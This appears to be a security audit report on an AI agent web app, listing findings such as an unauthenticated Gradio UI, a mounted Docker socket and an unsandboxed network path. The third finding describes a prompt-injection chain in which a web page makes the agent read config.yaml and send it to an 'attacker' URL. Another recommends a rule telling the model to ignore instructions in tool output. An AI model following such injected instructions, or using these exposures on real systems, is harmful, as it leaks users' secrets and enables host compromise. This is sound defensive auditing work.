title: Web UI published on 0.0.0.0:7861 without authentication
reason: The Docker image starts Gradio on all interfaces and compose publishes the port; launch() has no auth, so anyone who reaches the port can drive the agent (LLM spend, sandbox shell, and the host file-read tools above, including other users' workspaces).
fix: Bind to 127.0.0.1 in the compose port mapping or pass auth=... to demo.launch; put it behind an authenticating proxy.

title: Docker socket mounted into the web-facing host container
reason: The container that runs the unauthenticated web UI and the unsandboxed host tools holds the Docker socket, which is root on the host; any code execution in it (or a future tool bug) becomes full host compromise.
fix: Use a restricted Docker API proxy (allow only container create/run of the sandbox image) or a rootless/remote Docker daemon.

title: Untrusted web content + host file reads + outbound requests with no approval

evidence.quote: async def fetch_url(url: str, body_only: bool = True) -> str:

reason: A web page or uploaded document can instruct the agent to read config.yaml via document_summary/fetch_url(file://) and then call fetch_url('https://attacker/?d=<secret>'); nothing asks a human in between.
fix: Confine all host tools to the workspace (F009/F020/F021/M001/M002), allowlist outbound hosts or require approval for fetches after private data was read.

title: Fetched web pages returned raw into the model context
reason: fetch_url returns page text straight to the model without marking it as untrusted data, which is how injected instructions reach the agent that also holds the file and network tools.
fix: Wrap tool output in clear untrusted-data delimiters and tell the system prompt to never follow instructions from it.

title: Sandbox execute_command with network access and no approval
reason: The agent gets an unrestricted shell (allowedDirectories '/') by design; it is contained in a Docker sandbox with only the workspace mounted, but the container keeps default network access, so it is a ready exfiltration path for anything in the workspace.
fix: Run the sandbox with --network none (or an egress allowlist) and keep secrets out of the workspace.
